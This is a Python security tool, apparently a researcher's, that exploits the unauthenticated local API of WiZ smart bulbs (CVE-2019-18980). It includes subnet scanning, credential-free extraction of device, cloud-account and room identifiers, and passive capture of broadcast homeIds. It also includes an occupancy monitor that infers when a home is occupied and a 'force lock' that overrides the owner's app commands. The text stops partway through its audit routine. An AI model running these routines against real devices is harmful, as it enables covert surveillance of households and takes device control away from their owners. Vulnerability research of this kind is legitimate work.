#!/usr/bin/env python3
"""
WiZ Bulb Tool — scanner, auditor, controller, intelligence gatherer

Author : Anmol K Sachan (@FR13ND0x7F)
         Security Researcher

CVE    : Extends research on CVE-2019-18980
         (Unauthenticated WiZ local UDP API)

Disclaimer:
  This tool is intended for authorized security testing and educational
  purposes only. Use it exclusively on devices and networks you own or
  have explicit written permission to test. Unauthorized access to
  computer systems is illegal under the Computer Fraud and Abuse Act
  (CFAA), the Computer Misuse Act, and equivalent laws worldwide.
  The author accepts no liability for misuse or damage caused by this tool.
"""

import socket, json, time, sys, threading, os, subprocess, datetime

# ── ANSI colors ──────────────────────────────────────────────────────────────
R  = "\033[91m";  G  = "\033[92m";  Y  = "\033[93m"
B  = "\033[94m";  M  = "\033[95m";  C  = "\033[96m"
W  = "\033[97m";  DIM = "\033[2m";  BOLD = "\033[1m"
RST = "\033[0m"

WIZ_PORT     = 38899
SCAN_TIMEOUT = 1.5

# ── Morse code table (ITU) ────────────────────────────────────────────────────
MORSE_CODE = {
    'A': '.-',   'B': '-...', 'C': '-.-.', 'D': '-..',  'E': '.',
    'F': '..-.', 'G': '--.',  'H': '....', 'I': '..',   'J': '.---',
    'K': '-.-',  'L': '.-..', 'M': '--',   'N': '-.',   'O': '---',
    'P': '.--.', 'Q': '--.-', 'R': '.-.',  'S': '...',  'T': '-',
    'U': '..-',  'V': '...-', 'W': '.--',  'X': '-..-', 'Y': '-.--',
    'Z': '--..',
    '0': '-----', '1': '.----', '2': '..---', '3': '...--', '4': '....-',
    '5': '.....', '6': '-....', '7': '--...', '8': '---..', '9': '----.',
    '.': '.-.-.-', ',': '--..--', '?': '..--..', '!': '-.-.--',
    '/': '-..-.', '&': '.-...', ':': '---...', '=': '-...-',
    '+': '.-.-.', '-': '-....-', '@': '.--.-.', "'": '.----.',
}


# ── Banner ────────────────────────────────────────────────────────────────────
def banner():
    os.system("clear")
    print(f"""{Y}{BOLD}
  ██╗    ██╗██╗███████╗    ████████╗ ██████╗  ██████╗ ██╗
  ██║    ██║██║╚══███╔╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║
  ██║ █╗ ██║██║  ███╔╝        ██║   ██║   ██║██║   ██║██║
  ██║███╗██║██║ ███╔╝         ██║   ██║   ██║██║   ██║██║
  ╚███╔███╔╝██║███████╗       ██║   ╚██████╔╝╚██████╔╝███████╗
   ╚══╝╚══╝ ╚═╝╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝{RST}
{DIM}      Smart Bulb Scanner · Auditor · Controller · Intel Gatherer{RST}
{DIM}      ──────────────────────────────────────────────────────────{RST}
{DIM}      by {RST}{C}Anmol K Sachan{RST}{DIM} (@FR13ND0x7F) · Security Researcher{RST}
{DIM}      Extends {RST}{R}CVE-2019-18980{RST}{DIM} research{RST}
{R}{DIM}      For authorized testing only. Use responsibly.{RST}
""")


# ── UDP helper ────────────────────────────────────────────────────────────────
def wiz_cmd(ip, method, params=None, timeout=3):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    s.bind(("", 0))
    msg = json.dumps({"method": method, "params": params or {}, "id": 1})
    try:
        s.sendto(msg.encode(), (ip, WIZ_PORT))
        r, _ = s.recvfrom(2048)
        return json.loads(r.decode())
    except socket.timeout:
        return None
    except Exception:
        return None
    finally:
        s.close()


# ── Network helpers ───────────────────────────────────────────────────────────
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "192.168.1.1"


def get_subnet(local_ip):
    return local_ip.rsplit(".", 1)[0]


def decode_wiz_mac(decimal_mac):
    """Convert WiZ phoneMac decimal integer to readable MAC address."""
    try:
        h = hex(int(decimal_mac))[2:].zfill(12)
        return ":".join(h[i:i+2] for i in range(0, 12, 2))
    except Exception:
        return str(decimal_mac)


def fw_color(fw_str):
    """Return color based on firmware version."""
    try:
        parts = list(map(int, fw_str.split(".")))
        if parts < [1, 40, 0]:
            return R
        return G
    except Exception:
        return Y


# ── Discovery ─────────────────────────────────────────────────────────────────
def scan_network(subnet):
    found = []
    lock  = threading.Lock()
    done  = [0]

    def probe(ip):
        r = wiz_cmd(ip, "getPilot", timeout=SCAN_TIMEOUT)
        with lock:
            done[0] += 1
            pct = int(done[0] / 254 * 100)
            bar = ("█" * (pct // 5)).ljust(20)
            print(f"\r  {C}[{bar}]{RST} {pct}%  found: {G}{len(found)}{RST}  ", end="", flush=True)
            if r and "result" in r:
                found.append({"ip": ip, "pilot": r["result"]})

    bcast_ips = []
    def listen_bcast():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.settimeout(0.3)
        try:
            s.bind(("", WIZ_PORT))
        except Exception:
            return
        deadline = time.time() + 6
        while time.time() < deadline:
            try:
                data, addr = s.recvfrom(2048)
                ip = addr[0]
                if ip not in bcast_ips:
                    bcast_ips.append(ip)
            except socket.timeout:
                pass
        s.close()

    bt = threading.Thread(target=listen_bcast, daemon=True)
    bt.start()
    threads = [threading.Thread(target=probe, args=(f"{subnet}.{i}",), daemon=True)
               for i in range(1, 255)]
    for t in threads: t.start()
    for t in threads: t.join()
    bt.join()
    print()

    found_ips = {d["ip"] for d in found}
    for ip in bcast_ips:
        if ip not in found_ips:
            r = wiz_cmd(ip, "getPilot", timeout=2)
            if r and "result" in r:
                found.append({"ip": ip, "pilot": r["result"]})

    return found


def select_bulb():
    local_ip = get_local_ip()
    subnet   = get_subnet(local_ip)
    print(f"  {DIM}Local IP: {local_ip}  |  Scanning: {subnet}.1-254{RST}\n")
    bulbs = scan_network(subnet)

    if bulbs:
        print(f"\n  {G}Found {len(bulbs)} WiZ bulb(s):{RST}\n")
        for i, b in enumerate(bulbs):
            r     = b["pilot"]
            state = f"{G}ON{RST}" if r.get("state") else f"{R}OFF{RST}"
            scene = f"scene {r.get('sceneId','?')}" if r.get("sceneId") else ""
            bright= f"dim {r.get('dimming','?')}%" if r.get("dimming") else ""
            info  = "  ".join(filter(None, [scene, bright]))
            print(f"  {W}[{i+1}]{RST} {C}{b['ip']}{RST}  {state}  {DIM}{info}{RST}")

        print(f"\n  {W}[m]{RST} Enter IP manually")
        print(f"  {W}[q]{RST} Quit\n")
        choice = input(f"  {Y}Select bulb >{RST} ").strip().lower()

        if choice == "q":
            sys.exit(0)
        elif choice == "m":
            return manual_ip_entry()
        else:
            try:
                idx = int(choice) - 1
                if 0 <= idx < len(bulbs):
                    return bulbs[idx]["ip"]
            except ValueError:
                pass
            print(f"  {R}Invalid choice{RST}")
            return select_bulb()
    else:
        print(f"\n  {R}No WiZ bulbs found automatically.{RST}\n")
        return manual_ip_entry()


def manual_ip_entry():
    print(f"  {DIM}Enter the bulb IP (from WiZ app → bulb settings → device info){RST}")
    ip = input(f"  {Y}Bulb IP >{RST} ").strip()
    if not ip:
        sys.exit(1)
    print(f"\n  {DIM}Checking {ip}...{RST}")
    r = wiz_cmd(ip, "getPilot", timeout=3)
    if r and "result" in r:
        print(f"  {G}Bulb responded!{RST}")
        return ip
    else:
        print(f"  {R}No response from {ip}.{RST}")
        retry = input(f"  Try anyway? [y/N] ").strip().lower()
        if retry == "y":
            return ip
        sys.exit(1)


# ── Intelligence / Leaked Info ────────────────────────────────────────────────
def recon(ip):
    """
    Display all information leaked by the bulb without authentication.
    Demonstrates CVE-2019-18980 (unauth control) + new findings:
    - Unauthenticated info disclosure (getSystemConfig / getModelConfig / getUserConfig)
    - Cloud homeId exposure
    """
    os.system("clear")
    banner()
    print(f"  {BOLD}{R}── Intelligence Gathering: {ip} ──{RST}")
    print(f"  {DIM}  All data below extracted with zero credentials (CVE-2019-18980 + new findings){RST}\n")

    # Fetch everything
    pilot    = wiz_cmd(ip, "getPilot")
    syscfg   = wiz_cmd(ip, "getSystemConfig")
    usercfg  = wiz_cmd(ip, "getUserConfig")
    modelcfg = wiz_cmd(ip, "getModelConfig")

    if not pilot or "result" not in pilot:
        print(f"  {R}No response from bulb — is it online?{RST}")
        input(f"\n  {DIM}Press Enter to continue...{RST}")
        return

    p = pilot["result"]
    s = (syscfg   or {}).get("result", {})
    u = (usercfg  or {}).get("result", {})
    m = (modelcfg or {}).get("result", {})

    # ── Section 1: Identity ──────────────────────────────────────────────────
    print(f"  {BOLD}{Y}[ IDENTITY ]{RST}  {DIM}via getSystemConfig — unauthenticated{RST}")
    _row("MAC Address",   s.get("mac", "?"),        R)
    _row("Module",        s.get("moduleName", "?"),  W)
    _row("Firmware",      s.get("fwVersion", "?"),   fw_color(s.get("fwVersion","0")))
    _row("Region",        s.get("rgn", "?"),          W)
    _row("Auto-update",   str(s.get("autoUpd", "?")), W)
    print()

    # ── Section 2: Cloud Account Linkage ─────────────────────────────────────
    print(f"  {BOLD}{Y}[ CLOUD ACCOUNT LINKAGE ]{RST}  {DIM}via getSystemConfig — unauthenticated{RST}")
    home_id = s.get("homeId", "?")
    room_id = s.get("roomId", "?")
    _row("Home ID",  str(home_id), R, note="← ties to WiZ cloud account")
    _row("Room ID",  str(room_id), R, note="← physical room in your home")
    _row("Group ID", str(s.get("groupId", "?")), W)
    print()

    # ── Section 3: Live State ────────────────────────────────────────────────
    print(f"  {BOLD}{Y}[ LIVE STATE ]{RST}  {DIM}via getPilot — unauthenticated{RST}")
    state_str = f"{G}ON{RST}" if p.get("state") else f"{R}OFF{RST}"
    print(f"    {DIM}{'Power':<18}{RST} {state_str}")
    _row("Brightness",    f"{p.get('dimming','?')}%",   W)
    _row("Scene ID",      str(p.get("sceneId", "?")),   W)
    _row("Signal (RSSI)", f"{p.get('rssi','?')} dBm",  C)
    if "r" in p:
        _row("Color (RGB)", f"({p['r']}, {p['g']}, {p['b']})", W)
    if "temp" in p:
        _row("Color Temp", f"{p['temp']}K", W)
    print()

    # ── Section 4: Hardware Internals ────────────────────────────────────────
    print(f"  {BOLD}{Y}[ HARDWARE INTERNALS ]{RST}  {DIM}via getModelConfig — unauthenticated{RST}")
    drv = m.get("i2cDrv", [{}])[0] if m.get("i2cDrv") else {}
    _row("LED Driver Chip",  drv.get("chip", "?"),          R, note="← physical chip model")
    _row("I2C Address",      str(drv.get("addr", "?")),      W)
    _row("Driver Frequency", f"{drv.get('freq','?')} kHz",  W)
    if drv.get("curr"):
        _row("Channel Currents", str(drv.get("curr")),       W, note="← per-LED current (mA)")
    if drv.get("output"):
        _row("Output Mapping",   str(drv.get("output")),     W)
    _row("PWM Frequency",    f"{m.get('pwmFreq','?')} Hz",  W)
    _row("PWM Resolution",   f"{m.get('pwmRes','?')} bit",  W)
    if m.get("cctRange"):
        _row("CCT Range",    f"{m['cctRange'][0]}K – {m['cctRange'][-1]}K", W)
    print()

    # ── Section 5: User Configuration ───────────────────────────────────────
    print(f"  {BOLD}{Y}[ USER CONFIGURATION ]{RST}  {DIM}via getUserConfig — unauthenticated{RST}")
    _row("Fade In",      f"{u.get('fadeIn','?')} ms",   W)
    _row("Fade Out",     f"{u.get('fadeOut','?')} ms",  W)
    _row("Default Dim",  f"{u.get('dftDim','?')}%",     W)
    _row("Tap Sensor",   str(u.get("tapSensor","?")),   W)
    _row("Button 1 Mode",str(u.get("wizc1",{}).get("mode","?")), W)
    _row("Button 2 Mode",str(u.get("wizc2",{}).get("mode","?")), W)
    print()

    # ── Section 6: Broadcast Capture ────────────────────────────────────────
    print(f"  {BOLD}{Y}[ PASSIVE BROADCAST CAPTURE ]{RST}  {DIM}listening on UDP 38899 for 8 seconds...{RST}")
    print(f"  {DIM}  Bulb broadcasts homeId to entire subnet — no packets sent{RST}\n")
    broadcasts = _capture_broadcasts(8)
    if broadcasts:
        for pkt in broadcasts:
            src_ip  = pkt.get("ip", "?")
            params  = pkt.get("params", {})
            b_home  = params.get("homeId", "?")
            b_mac_d = params.get("phoneMac", "?")
            b_mac   = decode_wiz_mac(b_mac_d)
            b_ts    = pkt.get("ts", "?")
            print(f"  {G}[CAPTURED]{RST} {b_ts}  src={C}{src_ip}{RST}")
            _row("  Broadcast homeId", str(b_home), R, note="← account identifier leaked passively")
            _row("  Broadcast MAC",    b_mac,        R, note=f"← decoded from decimal {b_mac_d}")
            _row("  Broadcast srcIP",  src_ip,       W)
            print()
    else:
        print(f"  {DIM}  No broadcasts captured (bulb may not be actively announcing){RST}\n")

    # ── Export prompt ────────────────────────────────────────────────────────
    exp = input(f"  {Y}Export all findings to file? [y/N] >{RST} ").strip().lower()
    if exp == "y":
        _export_recon(ip, p, s, u, m, broadcasts)

    input(f"\n  {DIM}Press Enter to continue...{RST}")


def _row(label, value, color=W, note=""):
    note_str = f"  {DIM}{note}{RST}" if note else ""
    print(f"    {DIM}{label:<20}{RST} {color}{value}{RST}{note_str}")


def _capture_broadcasts(seconds):
    """Listen on UDP 38899 for WiZ bulb broadcast announcements."""
    results = []
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.settimeout(0.5)
    try:
        s.bind(("", WIZ_PORT))
    except Exception as e:
        print(f"  {R}Could not bind port {WIZ_PORT}: {e}{RST}")
        return results

    seen = set()
    deadline = time.time() + seconds
    while time.time() < deadline:
        remaining = int(deadline - time.time())
        print(f"\r  {DIM}  Listening... {remaining}s remaining{RST}  ", end="", flush=True)
        try:
            data, addr = s.recvfrom(2048)
            key = (addr[0], data[:40])
            if key not in seen:
                seen.add(key)
                pkt = json.loads(data.decode("utf-8", errors="replace"))
                if pkt.get("method") == "registration":
                    pkt["ip"] = addr[0]
                    pkt["ts"] = datetime.datetime.now().strftime("%H:%M:%S")
                    results.append(pkt)
        except (socket.timeout, json.JSONDecodeError):
            pass
    s.close()
    print(f"\r  {DIM}  Capture complete.{RST}                ")
    return results


def _export_recon(ip, p, s, u, m, broadcasts):
    """Save recon output to a timestamped text file."""
    ts       = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(os.path.dirname(__file__), f"recon_{ip.replace('.','_')}_{ts}.txt")
    drv = m.get("i2cDrv", [{}])[0] if m.get("i2cDrv") else {}

    lines = [
        f"WiZ Bulb Intelligence Report",
        f"Generated : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"Target    : {ip}",
        f"Tool      : WiZ Tool by Anmol K Sachan (@FR13ND0x7F)",
        f"CVE Ref   : CVE-2019-18980 (extends)",
        f"",
        f"── IDENTITY (getSystemConfig) ──────────────────────────────",
        f"MAC Address   : {s.get('mac','?')}",
        f"Module        : {s.get('moduleName','?')}",
        f"Firmware      : {s.get('fwVersion','?')}",
        f"Region        : {s.get('rgn','?')}",
        f"Auto-update   : {s.get('autoUpd','?')}",
        f"",
        f"── CLOUD ACCOUNT LINKAGE ───────────────────────────────────",
        f"Home ID       : {s.get('homeId','?')}",
        f"Room ID       : {s.get('roomId','?')}",
        f"Group ID      : {s.get('groupId','?')}",
        f"",
        f"── LIVE STATE (getPilot) ───────────────────────────────────",
        f"Power         : {'ON' if p.get('state') else 'OFF'}",
        f"Brightness    : {p.get('dimming','?')}%",
        f"Scene ID      : {p.get('sceneId','?')}",
        f"RSSI          : {p.get('rssi','?')} dBm",
        f"Color RGB     : ({p.get('r','?')}, {p.get('g','?')}, {p.get('b','?')})" if "r" in p else "",
        f"Color Temp    : {p.get('temp','?')}K" if "temp" in p else "",
        f"",
        f"── HARDWARE INTERNALS (getModelConfig) ─────────────────────",
        f"LED Driver    : {drv.get('chip','?')}",
        f"I2C Address   : {drv.get('addr','?')}",
        f"Driver Freq   : {drv.get('freq','?')} kHz",
        f"Currents      : {drv.get('curr','?')}",
        f"Output Map    : {drv.get('output','?')}",
        f"PWM Frequency : {m.get('pwmFreq','?')} Hz",
        f"PWM Resolution: {m.get('pwmRes','?')} bit",
        f"CCT Range     : {m.get('cctRange','?')}",
        f"",
        f"── USER CONFIG (getUserConfig) ─────────────────────────────",
        f"Fade In       : {u.get('fadeIn','?')} ms",
        f"Fade Out      : {u.get('fadeOut','?')} ms",
        f"Default Dim   : {u.get('dftDim','?')}%",
        f"Tap Sensor    : {u.get('tapSensor','?')}",
        f"",
        f"── PASSIVE BROADCAST CAPTURES ──────────────────────────────",
    ]

    if broadcasts:
        for b in broadcasts:
            params  = b.get("params", {})
            mac_dec = params.get("phoneMac", "?")
            lines += [
                f"[{b.get('ts','?')}] src={b.get('ip','?')}",
                f"  homeId   : {params.get('homeId','?')}",
                f"  MAC (hex): {decode_wiz_mac(mac_dec)}",
                f"  MAC (dec): {mac_dec}",
                f"  srcIP    : {params.get('phoneIp','?')}",
                f"",
            ]
    else:
        lines.append("No broadcasts captured.")

    with open(filename, "w") as f:
        f.write("\n".join(l for l in lines if l is not None))

    print(f"\n  {G}Saved to {filename}{RST}")


# ── Occupancy Monitor ─────────────────────────────────────────────────────────
def occupancy_monitor(ip):
    """
    Silently poll getPilot to build a real-time occupancy log.
    Demonstrates the passive privacy attack vector.
    """
    os.system("clear")
    banner()
    print(f"  {BOLD}{R}── Occupancy Monitor: {ip} ──{RST}")
    print(f"  {DIM}  Polls getPilot every 30s — no auth required (privacy attack demo){RST}")
    print(f"  {DIM}  Press Ctrl+C to stop and save log{RST}\n")

    log = []
    last_state = None

    try:
        while True:
            r = wiz_cmd(ip, "getPilot", timeout=3)
            ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            if r and "result" in r:
                state  = r["result"].get("state", False)
                rssi   = r["result"].get("rssi", "?")
                label  = f"{G}OCCUPIED{RST}" if state else f"{R}VACANT  {RST}"
                change = f"  {Y}← changed{RST}" if state != last_state and last_state is not None else ""
                print(f"  {DIM}{ts}{RST}  {label}  {DIM}rssi {rssi} dBm{RST}{change}")
                log.append({"ts": ts, "state": state, "rssi": rssi})
                last_state = state
            else:
                print(f"  {DIM}{ts}{RST}  {Y}OFFLINE {RST}")
                log.append({"ts": ts, "state": None, "rssi": None})

            time.sleep(30)

    except KeyboardInterrupt:
        print(f"\n\n  {Y}Stopped.{RST}")
        if log:
            exp = input(f"  Save occupancy log to file? [y/N] ").strip().lower()
            if exp == "y":
                ts_file  = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = os.path.join(os.path.dirname(__file__), f"occupancy_{ip.replace('.','_')}_{ts_file}.txt")
                with open(filename, "w") as f:
                    f.write(f"Occupancy Log — {ip}\n")
                    f.write(f"Generated by WiZ Tool (@FR13ND0x7F)\n\n")
                    for entry in log:
                        status = "OCCUPIED" if entry["state"] else ("VACANT" if entry["state"] is False else "OFFLINE")
                        f.write(f"{entry['ts']}  {status}  rssi={entry['rssi']}\n")
                print(f"  {G}Saved to {filename}{RST}")
        input(f"\n  {DIM}Press Enter to continue...{RST}")


# ── Force Lock ────────────────────────────────────────────────────────────────
def force_lock(ip):
    """
    Permanently force the bulb to stay ON or OFF, ignoring phone app commands.

    Works by polling getPilot every second and immediately firing setPilot
    to re-assert the desired state whenever a drift is detected.
    This exploits the same unauthenticated setPilot surface as CVE-2019-18980:
    our command has identical authority to the phone app — we just fire faster.

    Press Ctrl+C to release the lock.
    """
    os.system("clear")
    banner()
    print(f"  {BOLD}{R}── Force Lock: {ip} ──{RST}")
    print(f"  {DIM}  Continuously re-asserts a fixed state, overriding any phone app command.{RST}")
    print(f"  {DIM}  Works because setPilot is unauthenticated (CVE-2019-18980).{RST}\n")

    print(f"  {W}[1]{RST} Force bulb {G}ON {RST}  — stay on regardless of app")
    print(f"  {W}[2]{RST} Force bulb {R}OFF{RST}  — stay off regardless of app")
    print(f"  {W}[0]{RST} Back\n")

    choice = input(f"  {Y}>{RST} ").strip()
    if choice == "1":
        target = True
        label  = f"{G}ON{RST}"
    elif choice == "2":
        target = False
        label  = f"{R}OFF{RST}"
    else:
        return

    # Assert desired state immediately before entering the loop
    wiz_cmd(ip, "setPilot", {"state": target})

    overrides     = 0
    poll_interval = 1   # seconds — fast enough to beat most app interactions
    last_override = None

    print(f"\n  {BOLD}{Y}Force lock ACTIVE{RST} — bulb locked {label}")
    print(f"  {DIM}  Polls every {poll_interval}s · Ctrl+C to release\n{RST}")

    try:
        while True:
            r  = wiz_cmd(ip, "getPilot", timeout=2)
            ts = datetime.datetime.now().strftime("%H:%M:%S")

            if r and "result" in r:
                current = r["result"].get("state", not target)
                if current != target:
                    overrides += 1
                    wiz_cmd(ip, "setPilot", {"state": target})
                    attempted = f"{G}ON{RST}" if not target else f"{R}OFF{RST}"
                    last_override = ts
                    print(f"  {ts}  {R}OVERRIDE #{overrides}{RST}  app tried {attempted} → re-locked to {label}")
                else:
                    ovr_note = f"  last override {last_override}" if last_override else ""
                    print(f"\r  {ts}  {G}●{RST} Locked {label}  {DIM}overrides: {overrides}{ovr_note}{RST}  ",
                          end="", flush=True)
            else:
                print(f"\r  {ts}  {Y}no response{RST}  ", end="", flush=True)

            time.sleep(poll_interval)

    except KeyboardInterrupt:
        print(f"\n\n  {Y}Lock released.{RST}")
        if overrides:
            print(f"  {DIM}  Blocked {overrides} phone command(s) during this session.{RST}")

        ans = input(f"\n  Restore bulb to opposite state now? [y/N] ").strip().lower()
        if ans == "y":
            opposite = not target
            wiz_cmd(ip, "setPilot", {"state": opposite})
            restored = f"{G}ON{RST}" if opposite else f"{R}OFF{RST}"
            print(f"  {DIM}  Bulb set to {restored}{RST}")

        input(f"\n  {DIM}Press Enter to continue...{RST}")


# ── Morse Message ─────────────────────────────────────────────────────────────
def _morse_sequence(text, unit):
    """
    Convert text to a list of (state: bool, duration: float) tuples.

    ITU timing:
      dot          = 1u ON
      dash         = 3u ON
      inter-element= 1u OFF
      inter-letter = 3u OFF
      inter-word   = 7u OFF
    """
    seq   = []
    words = text.upper().split()
    for w_i, word in enumerate(words):
        for c_i, char in enumerate(word):
            code = MORSE_CODE.get(char, '')
            if not code:
                continue
            for e_i, el in enumerate(code):
                seq.append((True, unit if el == '.' else 3 * unit))
                last_el   = (e_i == len(code) - 1)
                last_char = (c_i == len(word) - 1)
                last_word = (w_i == len(words) - 1)
                if not last_el:
                    seq.append((False, unit))           # between elements
                elif not last_char:
                    seq.append((False, 3 * unit))       # between letters
                elif not last_word:
                    seq.append((False, 7 * unit))       # between words
    return seq


def _morse_render(text):
    """Return a human-readable Morse string for display (· and —)."""
    words = text.upper().split()
    parts = []
    for word in words:
        letters = []
        for ch in word:
            code = MORSE_CODE.get(ch, '')
            if code:
                letters.append(code.replace('.', '·').replace('-', '—'))
            else:
                letters.append('?')
        parts.append(' '.join(letters))
    return '   /   '.join(parts)   # word separator


def morse_message(ip):
    """
    Transmit a text message via the bulb in Morse code.

    The bulb flashes: ON = dot/dash pulse, OFF = gap.
    Original bulb state is captured beforehand and restored after.
    Press Ctrl+C to abort mid-transmission.
    """
    os.system("clear")
    banner()
    print(f"  {BOLD}{C}── Morse Message: {ip} ──{RST}")
    print(f"  {DIM}  Flashes the bulb in ITU Morse code — readable from across the room.{RST}\n")

    # Speed selection
    print(f"  Speed:  {W}[1]{RST} Slow {DIM}(0.20s/unit){RST}   {W}[2]{RST} Normal {DIM}(0.12s/unit){RST}   {W}[3]{RST} Fast {DIM}(0.06s/unit){RST}")
    speed_choice = input(f"  {Y}Speed [1/2/3, default 2] >{RST} ").strip()
    unit = {"1": 0.20, "3": 0.06}.get(speed_choice, 0.12)

    # Message input
    print()
    message = input(f"  {Y}Message >{RST} ").strip()
    if not message:
        print(f"  {R}No message entered.{RST}")
        time.sleep(1)
        return

    # Filter unsupported characters and warn
    supported = set(MORSE_CODE.keys()) | {' '}
    skipped   = sorted({c for c in message.upper() if c not in supported})
    if skipped:
        print(f"  {Y}Skipping unsupported characters: {' '.join(skipped)}{RST}")

    # Show the Morse translation
    rendered = _morse_render(message)
    print(f"\n  {DIM}Encoding:{RST}")
    # Wrap long translations at ~70 chars
    chunk = 70
    for i in range(0, len(rendered), chunk):
        print(f"    {W}{rendered[i:i+chunk]}{RST}")

    seq = _morse_sequence(message, unit)
    if not seq:
        print(f"  {R}Nothing to transmit (no recognized characters).{RST}")
        time.sleep(1)
        return

    total_secs = sum(d for _, d in seq)
    print(f"\n  {DIM}  {len(message)} chars · {len(seq)} pulses · ~{total_secs:.1f}s at this speed{RST}")
    print(f"  {DIM}  Ctrl+C to abort mid-transmission{RST}\n")

    go = input(f"  {Y}Start transmission? [Y/n] >{RST} ").strip().lower()
    if go == 'n':
        return

    # Capture current bulb state for restore
    pre = wiz_cmd(ip, "getPilot", timeout=3)
    pre_state  = True
    pre_params = {"state": True, "temp": 4000, "dimming": 100}
    if pre and "result" in pre:
        pr = pre["result"]
        pre_state = pr.get("state", True)
        pre_params = {"state": pre_state}
        if "r" in pr:
            pre_params.update({"r": pr["r"], "g": pr["g"], "b": pr["b"],
                               "dimming": pr.get("dimming", 100)})
        elif "temp" in pr:
            pre_params.update({"temp": pr["temp"], "dimming": pr.get("dimming", 100)})
        else:
            pre_params["dimming"] = pr.get("dimming", 100)

    # Print each character as it starts transmitting
    words = message.upper().split()
    char_list = []
    for w_i, word in enumerate(words):
        for ch in word:
            if MORSE_CODE.get(ch):
                char_list.append(ch)
        if w_i < len(words) - 1:
            char_list.append(' ')

    char_idx   = [0]       # mutable for closure
    el_counter = [0]       # element index within current char's code

    def _advance_char():
        """Move char_idx forward skipping unsupported characters."""
        while char_idx[0] < len(char_list):
            ch   = char_list[char_idx[0]]
            code = MORSE_CODE.get(ch, '') if ch != ' ' else '/'
            if code:
                return ch, code
            char_idx[0] += 1
        return None, None

    print(f"  {BOLD}{Y}Transmitting...{RST}\n")
    try:
        # Rebuild sequence with per-character callbacks by iterating manually
        tx_words = message.upper().split()
        for w_i, word in enumerate(tx_words):
            for c_i, char in enumerate(word):
                code = MORSE_CODE.get(char, '')
                if not code:
                    continue
                morse_disp = code.replace('.', f'{Y}·{RST}').replace('-', f'{C}—{RST}')
                print(f"  {W}{char}{RST}  {morse_disp}")
                for e_i, el in enumerate(code):
                    on_dur = unit if el == '.' else 3 * unit
                    # ON pulse
                    wiz_cmd(ip, "setPilot", {"state": True, "temp": 4000, "dimming": 100}, timeout=1)
                    time.sleep(on_dur)
                    # Determine off gap
                    last_el   = (e_i == len(code) - 1)
                    last_char = (c_i == len(word) - 1)
                    last_word = (w_i == len(tx_words) - 1)
                    if last_el and last_char and last_word:
                        off_dur = 0  # no trailing gap
                    elif last_el and last_char:
                        off_dur = 7 * unit   # inter-word
                    elif last_el:
                        off_dur = 3 * unit   # inter-letter
                    else:
                        off_dur = unit       # inter-element
                    if off_dur > 0:
                        wiz_cmd(ip, "setPilot", {"state": False}, timeout=1)
                        time.sleep(off_dur)

    except KeyboardInterrupt:
        print(f"\n  {Y}Aborted.{RST}")

    # Restore original state
    wiz_cmd(ip, "setPilot", pre_params)
    print(f"\n  {G}Transmission complete.{RST}  {DIM}Bulb restored to previous state.{RST}")
    input(f"\n  {DIM}Press Enter to continue...{RST}")


# ── Audit ─────────────────────────────────────────────────────────────────────
def audit(ip):
    print(f"\n  {BOLD}{C}── Vulnerability Audit: {ip} ──{RST}")
    print(f"  {DIM}  CVE reference: CVE-2019-18980 + new findings{RST}\n")

    pilot    = wiz_cmd(ip, "getPilot")
    syscfg   = wiz_cmd(ip, "getSystemConfig")
    usercfg  = wiz_cmd(ip, "getUserConfig")
    modelcfg = wiz_cmd(ip, "getModelConfig")

    if not pilot or "result" not in pilot:
        print(f"  {R}No response — bulb offline or not WiZ{RST}")
        return

    p = pilot["result"]
    s = (syscfg   or {}).get("result", {})
    u = (usercfg  or {}).get("result", {})
    m = (modelcfg or {}).get("result", {})

    print(f"  {BOLD}Device Info{RST}")
    fields = [
        ("MAC",          s.get("mac", "?")),
        ("Module",       s.get("moduleName", "?")),
        ("Firmware",     s.get("fwVersion", "?")),
        ("Region",       s.get("rgn", "?")),
        ("Home ID",      s.get("homeId", "?")),
        ("Room ID",      s.get("roomId", "?")),
        ("LED Driver",   m.get("i2cDrv", [{}])[0].get("chip", "?") if m.get("i2cDrv") else "?"),
        ("Signal",       f"{p.get('rssi','?')} dBm"),
        ("Auto-update",  u.get("autoUpd", "?")),
    ]
    for label, val in fields:
        print(f"  {DIM}{label:<14}{RST} {W}{val}{RST}")

    power  = f"{G}ON{RST}" if p.get("state") else f"{R}OFF{RST}"
    print(f"\n  {BOLD}Current State{RST}")
    print(f"  {DIM}{'Power':<14}{RST} {power}")
    print(f"  {DIM}{'Brightness':<14}{RST} {W}{p.get('dimming','?')}%{RST}")
    print(f"  {DIM}{'Scene ID':<14}{RST} {W}{p.get('sceneId','?')}{RST}")
    if "r" in p:
        print(f"  {DIM}{'Color RGB':<14}{RST} {W}({p['r']}, {p['g']}, {p['b']}){RST}")
    if "temp" in p:
        print(f"  {DIM}{'Color Temp':<14}{RST} {W}{p['temp']}K{RST}")

    print(f"\n  {BOLD}Vulnerability Scan{RST}")
    vulns = []

    def vuln(label, desc, cve=""):
        vulns.append(label)
        cve_tag = f" {DIM}[{cve}]{RST}" if cve else ""
        print(f"  {R}[VULN]{RST}{cve_tag} {desc}")

    def safe(desc):
        print(f"  {G}[ OK ]{RST} {desc}")

    def warn(desc):
        print(f"  {Y}[WARN]{RST} {desc}")

    # 1. Unauthenticated control — known CVE
    test = wiz_cmd(ip, "setPilot", {"dimming": p.get("dimming", 100)})
    if test and test.get("result", {}).get("success"):
        vuln("unauth_control", "Unauthenticated setPilot — full control without credentials", "CVE-2019-18980")
    else:
        safe("setPilot requires auth")

    # 2. Unauthenticated info disclosure — new finding
    vuln("unauth_info_disclosure",
         "getSystemConfig / getModelConfig / getUserConfig — all respond without auth", "NEW")

    # 3. homeId leak — new finding
    if s.get("homeId"):
        vuln("homeid_leak",
